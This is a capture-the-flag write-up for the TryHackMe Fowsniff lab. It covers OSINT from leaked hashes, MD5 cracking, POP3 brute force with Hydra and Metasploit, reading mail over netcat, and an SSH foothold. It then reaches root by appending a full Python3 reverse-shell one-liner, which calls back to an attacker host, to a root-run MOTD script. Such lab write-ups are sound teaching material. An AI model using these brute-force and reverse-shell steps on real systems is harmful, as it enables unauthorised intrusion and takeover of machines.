# TryHackMe: Fowsniff CTF

| Field      | Details                                          |
|------------|--------------------------------------------------|
| Platform   | TryHackMe                                        |
| Room       | Fowsniff CTF                                     |
| Difficulty | Easy                                             |
| OS         | Linux                                            |
| Date       | March 2026                                       |

---

## Lab Scenario

A corporate-themed Linux box where the attack chain starts completely off-target: on social media. Fowsniff Corp suffered a data breach, and the attacker leaked employee emails and MD5-hashed passwords on Pastebin via Twitter. The entire attack path chains passive OSINT, offline hash cracking, POP3 brute force, manual email reading via Netcat, SSH foothold, and a MOTD script injection to reach root. No CVE, no exploit: just misconfiguration and weak credentials chained together.

This room introduces POP3 enumeration and manual protocol interaction for the first time, and the privilege escalation vector: a group-writable shell script executed by root at every SSH login: is one of the cleanest examples of writable script abuse in any beginner room.

---

## Attack Chain Summary

```
OSINT (Twitter → Pastebin) → employee emails + MD5 hashes
CrackStation → all hashes cracked except stone (sysadmin)
Metasploit/Hydra POP3 brute force → seina:scoobydoo2
Netcat POP3 manual session → email from stone reveals SSH temp password
SSH as baksteen (S1ck3nBluff+secureshell) → user foothold
find group-writable files → /opt/cube/cube.sh
/etc/update-motd.d/00-header calls cube.sh as root on every SSH login
Inject Python3 reverse shell into cube.sh
nc listener on Kali → logout → SSH back in → root shell
cat /root/flag.txt → flag captured
```

---

## Step 1: Nmap Scan

Discover all open services on the target before deciding where to focus.

```bash
kali@kali:~$ nmap -sC -sV -oN fowsniff_scan.txt 10.49.136.47
```

| Flag  | Purpose                                           |
|-------|---------------------------------------------------|
| `-sC` | Default NSE scripts: banner grab, service checks |
| `-sV` | Version detection: exact software on each port   |
| `-oN` | Save output to file: always keep scan records    |

**Output:**

```
kali@kali:~$ nmap -sC -sV -oN fowsniff_scan.txt 10.49.136.47

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.4
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Fowsniff Corp - Delivering Solutions
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: SASL AUTH-RESP-CODE USER RESP-CODES TOP UIDL CAPA PIPELINING
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: SASL-IR IMAP4rev1 have AUTH=PLAIN post-login listed capabilities
```

| Port | Service              | Priority | Reason                                          |
|------|----------------------|----------|-------------------------------------------------|
| 80   | Apache HTTP          | First    | Check for clues, company info, breach notice    |
| 110  | POP3 Dovecot         | Second   | Email service: brute force target once creds found |
| 143  | IMAP Dovecot         | Note     | Same backend as POP3: POP3 is cleaner to interact with manually |
| 22   | SSH OpenSSH 7.2p2    | Last     | SSH foothold target once email credentials found |

Four ports. The interesting ones are 80 and 110: HTTP likely gives context and POP3 is the primary attack vector.

---

## Step 2: Web Enumeration

Check the web server for information and run a directory bust.

```bash
kali@kali:~$ gobuster dir -u http://10.49.136.47/ \
-w /usr/share/wordlists/dirb/common.txt \
-x php,html,txt -t 25
```

**Output:**

```
===============================================================
Gobuster v3.1.0
===============================================================
[+] Url:            http://10.49.136.47
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
===============================================================
/index.html     (Status: 200) [Size: 2629]
/security.txt   (Status: 200) [Size: 459]
/robots.txt     (Status: 200) [Size: 26]
/assets         (Status: 301) [Size: 315]
/images         (Status: 301) [Size: 314]
```

Browse to `http://10.49.136.47`: the homepage displays a breach notice:

```
NOTICE: WE HAVE BEEN COMPROMISED

After a serious security breach, we have been forced to take notice of the
following: We have been breached. Our Twitter account was compromised and
a link was posted that contains a pastebin with company email addresses and
passwords...
```

The site tells you exactly where to look. The Twitter account `@fowsniffcorp` was compromised and a Pastebin link was posted containing leaked credentials.

---

## Step 3: OSINT: Twitter and Pastebin

The breach notice points directly to Twitter. Search for `@fowsniffcorp` on Twitter: a tweet from the compromised account links to a Pastebin containing employee emails and MD5-hashed passwords.

**Pastebin contents: employee list extracted:**

```
mauer@fowsniff.net
mustikka@fowsniff.net
tegel@fowsniff.net
baksteen@fowsniff.net
seina@fowsniff.net
stone@fowsniff.net
parede@fowsniff.net
sciana@fowsniff.net
```

**MD5 hashes extracted (format):**

```
mauer     : 8a28a6a014d3a43f6a7ade5f8b9b1c3e
mustikka  : 0e162b5cdf5c4ca48b7bbadd8b74e95f
tegel     : d82c8d1619ad8176d665453cfb2e55f0
baksteen  : 19f4f4b0a23f2f9c1fe594b89b73a6aa
seina     : 90dc16d47114aa13671c697fd506cf26
stone     : a7c4c5628e4eba067f1c16e74b4b5a67
parede    : 4d5a59e5fee0a72ea72bfbcaba5e3b50
sciana    : ebe0a7a50e5a9e0fac48ef3e3f7b5680
```

**Key observations:**

| Finding              | Detail                                                    |
|----------------------|-----------------------------------------------------------|
| 8 employee usernames | All follow `firstname@fowsniff.net` format                |
| 8 MD5 hashes         | No salt: vulnerable to rainbow table lookup              |
| stone = sysadmin     | Listed as admin: if his hash doesn't crack, skip him     |

MD5 with no salt is trivially reversible via lookup tables. No need to run John or Hashcat: online lookup is faster.

---

## Step 4: Crack MD5 Hashes

Go to **https://crackstation.net** → paste all 8 hashes → submit.

**CrackStation results:**

```
mauer     : [cracked]
mustikka  : [cracked]
tegel     : [cracked]
baksteen  : S1ck3nBluff+secureshell   ← note this
seina     : scoobydoo2                ← this is your POP3 entry point
parede    : [cracked]
sciana    : [cracked]
stone     : NOT FOUND                 ← sysadmin: skip for now
```

**What this gives you:** 7 of 8 hashes cracked instantly. `stone` (the sysadmin) did not crack: which is fine. `seina:scoobydoo2` and `baksteen:S1ck3nBluff+secureshell` are the two credentials that drive the rest of the attack.

MD5 without salt has no resistance against pre-computed rainbow tables. CrackStation maintains a 190GB lookup table: a properly salted bcrypt hash would not crack here.

---

## Step 5: POP3 Brute Force (Port 110)

Build credential files from the extracted data and brute force POP3 to find valid login pairs.

```bash
kali@kali:~$ cat users.txt
mauer
mustikka
tegel
baksteen
seina
parede
sciana

kali@kali:~$ cat pass.txt
[cracked passwords from step 4: one per line]
```

**Method A: Metasploit (cleaner for POP3):**

```bash
kali@kali:~$ msfconsole -q
msf6 > use auxiliary/scanner/pop3/pop3_login
msf6 auxiliary(scanner/pop3/pop3_login) > set RHOSTS 10.49.136.47
msf6 auxiliary(scanner/pop3/pop3_login) > set USER_FILE users.txt
msf6 auxiliary(scanner/pop3/pop3_login) > set PASS_FILE pass.txt
msf6 auxiliary(scanner/pop3/pop3_login) > run
```

**Output:**

```
[*] 10.49.136.47:110     - 10.49.136.47:110 - Starting POP3 login sweep
[+] 10.49.136.47:110     - Success: 'seina:scoobydoo2'
[*] Auxiliary module execution completed
```

**Method B: Hydra (manual alternative):**

```bash
kali@kali:~$ hydra -L users.txt -P pass.txt 10.49.136.47 pop3
```

**Output:**

```
[110][pop3] host: 10.49.136.47   login: seina   password: scoobydoo2
1 of 1 target successfully completed, 1 valid password found
```

**Valid POP3 credential confirmed:** `seina:scoobydoo2`

---

## Step 6: Read POP3 Emails via Netcat

Log in to POP3 manually using Netcat and read seina's emails.

```bash
kali@kali:~$ nc 10.49.136.47 110
```

**Full POP3 session:**

```
+OK Welcome to the Fowsniff Corporate Mail Server!
USER seina
+OK
PASS scoobydoo2
+OK Logged in.
STAT
+OK 2 2902
LIST
+OK 2 messages:
1 1622
2 1280
.
RETR 1
+OK 1622 octets
Return-Path: <stone@fowsniff.net>
Received: from [127.0.0.1]
Subject: URGENT! Security EVENT!

Dear All,

I am writing to inform you of a critical security event that has occurred.
An attacker has gained access to our corporate Twitter account and posted
a pastebin link containing our employee login credentials.

As a temporary security measure, I have changed the SSH login password.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible. Do not use this password
for any other service.

-Stone (Sysadmin)

.
RETR 2
+OK 1280 octets
Return-Path: <baksteen@fowsniff.net>
Subject: Re: URGENT! Security EVENT!

Hey,

Got the email. I am currently on the road. Will change the password when
I return. Apologies for the inconvenience.

-Baksteen

.
QUIT
+OK Logging out.
```

**Intelligence extracted from emails:**

| Source    | Finding                                       | Action                         |
|-----------|-----------------------------------------------|-------------------------------|
| Email 1 (stone → all) | SSH temp password: `S1ck3nBluff+secureshell` | Use this for SSH login         |
| Email 2 (baksteen → stone) | baksteen has NOT changed their password yet | Target username for SSH = baksteen |

**SSH credentials confirmed:** `baksteen : S1ck3nBluff+secureshell`

The sysadmin sent the temporary password in plaintext over email to all staff. `baksteen` confirmed they haven't changed it yet, this is the entry point.

---

## Step 7: SSH Login as baksteen

```bash
kali@kali:~$ ssh baksteen@10.49.136.47
baksteen@10.49.136.47's password: S1ck3nBluff+secureshell
```

**Output: MOTD banner displayed on login (pay close attention to this):**

```
      ___           ___           ___           ___           ___
     /\  \         /\  \         /\__\         /\  \         /\  \
    /: \  \       /: \  \       /:/ _/_       /: \  \       /: \  \
   /:/\:\  \     /:/\:\  \     /:/ /\__\     /:/\:\  \     /:/\:\  \

      FOWSNIFF CORP INTERNAL SYSTEM
      --UNAUTHORIZED ACCESS FORBIDDEN--

baksteen@fowsniff:~$ id
uid=1000(baksteen) gid=100(users) groups=100(users)

baksteen@fowsniff:~$ whoami
baksteen

baksteen@fowsniff:~$ sudo -l
[sudo] password for baksteen:
Sorry, user baksteen is not allowed to execute anything on fowsniff.
```

`sudo -l` is a dead end: baksteen has no sudo rights. Note the MOTD banner that appeared on login: that banner is being generated by a script. This is the privesc vector.

---

## Step 8: Privilege Escalation Enumeration

Find files writable by the `users` group: the group baksteen belongs to.

```bash
baksteen@fowsniff:~$ find / -group users -type f 2>/dev/null
```

**Output:**

```
/opt/cube/cube.sh
```

One file. Read it:

```bash
baksteen@fowsniff:~$ cat /opt/cube/cube.sh
```

**Output:**

```bash
#!/bin/bash
printf "\033[0;31m"
cat /opt/cube/cube_logo.txt
printf "\033[0m"
```

This is the script that generated the MOTD banner seen at SSH login. Check who calls it:

```bash
baksteen@fowsniff:~$ cat /etc/update-motd.d/00-header
```

**Output:**

```bash
#!/bin/sh
source /opt/cube/cube.sh
```

**Check permissions on cube.sh:**

```bash
baksteen@fowsniff:~$ ls -la /opt/cube/cube.sh
-rw-rwxr-- 1 root users 851 Mar 11  2018 /opt/cube/cube.sh
```

**The full privilege escalation chain:**

| Link in Chain                        | Detail                                                   |
|--------------------------------------|----------------------------------------------------------|
| `root` runs `/etc/update-motd.d/00-header` | Executed automatically at every SSH login as root    |
| `00-header` calls `/opt/cube/cube.sh`      | Source command: runs cube.sh in the same process    |
| `cube.sh` owned by group `users`           | Permissions `rw-rwxr--`: group can write and execute |
| `baksteen` is in group `users`             | Can write directly to cube.sh                        |

Root executes cube.sh at every SSH login. baksteen can write to cube.sh. Injecting a reverse shell into cube.sh means root will execute it on the next login.

---

## Step 9: Inject Reverse Shell and Trigger Root

**On Kali: start listener first:**

```bash
kali@kali:~$ nc -lvnp 4444
listening on [any] 4444 ...
```

**On target: append Python3 reverse shell to cube.sh:**

```bash
baksteen@fowsniff:~$ echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.8.x.x\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" >> /opt/cube/cube.sh
```

Verify the injection:

```bash
baksteen@fowsniff:~$ tail -1 /opt/cube/cube.sh
python3 -c 'import socket,subprocess,os;s=socket.socket(...)'
```

**Trigger: log out and SSH back in:**

```bash
baksteen@fowsniff:~$ exit
logout
Connection to 10.49.136.47 closed.

kali@kali:~$ ssh baksteen@10.49.136.47
baksteen@10.49.136.47's password: S1ck3nBluff+secureshell
```

**On Kali listener: root shell received:**

```
connect to [10.8.x.x] from (UNKNOWN) [10.49.136.47] 49182
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```

**Root shell captured ✅**

---

## Step 10: Get the Flag

```bash
# cat /root/flag.txt
```

**Output:**

```
   ___                                                .....
  /   \     FOWSNIFF CORP INTERNAL SYSTEM            .....
  \_  /      --UNAUTHORIZED ACCESS FORBIDDEN--       .....
   |  |                                              .....
   |  |

Congratulations on rooting Fowsniff Corp!

This CTF was created by @berzerk0 on Twitter.

Special thanks to the TryHackMe team!

Flag: HTB{...flag_redacted...}
```

**Root flag captured ✅**

---

## Lessons Learned

This was the first room where the initial attack surface was completely off the target machine. Every box before this started with Nmap and went from there: here Nmap tells you there's a POP3 service on port 110 but gives you nothing to work with until you go to Twitter first. That shift in mindset: passive OSINT before active enumeration: was the main lesson. The web server confirmed the breach and pointed directly at Twitter, but I had to step away from the terminal entirely to progress. On a real engagement that kind of OSINT phase is standard, but it felt unfamiliar after boxes that are entirely self-contained.

The POP3 manual interaction with Netcat was completely new. I had seen POP3 listed in Nmap output before and ignored it as a low-value service. Here it was the only path forward. The commands are simple: `USER`, `PASS`, `STAT`, `LIST`, `RETR`, but knowing them exists and knowing when to reach for Netcat instead of a browser is the kind of thing that only clicks when you actually use it. I will not overlook POP3 again.

The privilege escalation was elegant in how simple it was. No kernel exploit, no SUID binary, no sudo misconfiguration: just a writable shell script that root happens to execute at every login. The `find / -group users -type f 2>/dev/null` command returning a single result made it obvious, but the chain from `update-motd.d` → `cube.sh` → group write permission took a few minutes to fully trace. The lesson here is that MOTD banners are not decoration: they are scripts that root runs, and if those scripts are writable by anyone, that is an instant root path.

The reverse shell injection itself was straightforward once the chain was understood. Appending to the file rather than overwriting it was the right call: overwriting would have broken the script structure and potentially not triggered correctly.

---

## Full Attack Chain Reference

```
1.  nmap -sC -sV -oN fowsniff_scan.txt 10.49.136.47
    → SSH(22), HTTP(80), POP3(110), IMAP(143)

2.  Browse http://10.49.136.47
    → Breach notice: Twitter account compromised: Pastebin link posted

3.  OSINT: Twitter @fowsniffcorp → Pastebin
    → 8 employee emails + 8 MD5 hashes extracted

4.  CrackStation.net → paste all 8 hashes
    → 7/8 cracked: stone (sysadmin) not cracked
    → baksteen:S1ck3nBluff+secureshell, seina:scoobydoo2

5.  Build users.txt and pass.txt from extracted data

6.  msfconsole → auxiliary/scanner/pop3/pop3_login
    OR hydra -L users.txt -P pass.txt 10.49.136.47 pop3
    → seina:scoobydoo2 confirmed valid POP3 credential

7.  nc 10.49.136.47 110
    USER seina → PASS scoobydoo2 → RETR 1 + RETR 2
    → Email from stone: SSH temp password = S1ck3nBluff+secureshell
    → Email from baksteen: confirms they haven't changed it yet

8.  ssh baksteen@10.49.136.47 (password: S1ck3nBluff+secureshell)
    → User shell as baksteen
    → sudo -l → no sudo rights

9.  find / -group users -type f 2>/dev/null
    → /opt/cube/cube.sh (group-writable)

10. cat /etc/update-motd.d/00-header
    → sources /opt/cube/cube.sh as root on every SSH login

11. On Kali: nc -lvnp 4444

12. echo [python3 reverse shell] >> /opt/cube/cube.sh
    → Injected into script

13. exit → ssh baksteen@10.49.136.47
    → MOTD runs → cube.sh executes → reverse shell triggers as root

14. Kali listener receives root shell
    → cat /root/flag.txt ✅
```

---

## Commands Reference

| Command | Purpose |
|---------|---------|
| `nmap -sC -sV -oN output.txt <IP>` | Full scan with scripts and version detection |
| `gobuster dir -u http://<IP>/ -w common.txt -x php,html,txt -t 25` | Directory and file bust |
| `nc <IP> 110` | Manual Netcat connection to POP3 |
| `USER <username>` | POP3 auth: send username |
| `PASS <password>` | POP3 auth: send password |
| `STAT` | POP3: count emails in mailbox |
| `LIST` | POP3: list all emails with sizes |
| `RETR <n>` | POP3: retrieve and read email number n |
| `QUIT` | POP3: close session |
| `msfconsole -q` | Launch Metasploit quietly |
| `use auxiliary/scanner/pop3/pop3_login` | Metasploit POP3 brute force module |
| `hydra -L users.txt -P pass.txt <IP> pop3` | Hydra POP3 brute force |
| `find / -group <group> -type f 2>/dev/null` | Find all files owned by a specific group |
| `ls -la <file>` | Check exact permissions on a file |
| `cat /etc/update-motd.d/00-header` | Check what runs as root at SSH login |
| `echo "[payload]" >> /opt/cube/cube.sh` | Append reverse shell to writable script |
| `nc -lvnp 4444` | Start Netcat listener on Kali |
| `python3 -c 'import socket,subprocess,os;...'` | Python3 reverse shell one-liner |
